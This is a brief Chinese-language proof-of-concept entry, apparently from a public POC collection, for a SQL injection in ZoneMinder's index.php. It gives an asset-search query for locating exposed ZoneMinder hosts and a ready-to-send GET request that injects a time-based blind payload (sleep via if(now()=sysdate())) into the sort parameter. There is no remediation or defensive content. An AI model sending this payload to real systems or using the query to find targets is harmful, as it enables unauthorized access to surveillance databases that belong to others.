# ZoneMinder index存在SQL注入漏洞

# 一、漏洞简介
ZoneMinder index存在SQL注入漏洞

# 二、影响版本
+ ZoneMinder

# 三、资产测绘
```plain
app="ZoneMinder"
```


# 四、漏洞复现
```plain
GET /zm/index.php?sort=**if(now()=sysdate()%2Csleep(6)%2C0)**&order=desc&limit=20&view=request&request=watch&mid=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gore50bddk9vgsxg>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
